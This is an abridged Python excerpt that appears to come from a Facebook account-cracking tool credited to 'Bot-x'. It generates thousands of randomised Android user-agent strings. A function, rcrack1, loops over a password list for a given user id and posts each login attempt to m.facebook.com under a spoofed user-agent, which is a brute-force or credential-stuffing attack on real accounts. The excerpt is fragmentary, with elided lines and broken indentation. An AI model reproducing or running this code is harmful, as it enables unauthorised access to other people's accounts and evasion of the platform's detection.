...
for ak in range(10000):
	a='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['9','10','14','15'])
	c='Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(50,115)
	e='115.0.5790.167'
	f=random.randrange(5000,10000)
	g=random.randrange(100,200)
	h='Mobile Safari/537.36 OPR/77.1.4095.74475'
	akash=(f"({a} {b};) {c}{d}{e} {f}{g} {h}")
	ugen.append(akash)
...
███████ ███████ ██    ██    ███████ 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[🌺] AUTHOR    \033[1;91m: \033[1;92mBot-x                
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
		    ...
		    'user-agent':pro,}
            lo = session.post('https://m.facebook.com/?stype=lo&jlou=Afdxtq0NzlYMNlsIV4dkgdI0qBmEcg8Gc03zsHurMq-65KYHyCzjRjcfOgyVlsy69K4BuHv-vVzYLDkX4Y7RwZKyvbHqhS1nWcPdVIg1MLeaZw&smuh=5471&lh=Ac-r1HjLkhFotM1G7HI&_rdr',data=log_data,headers=header_freefb).text
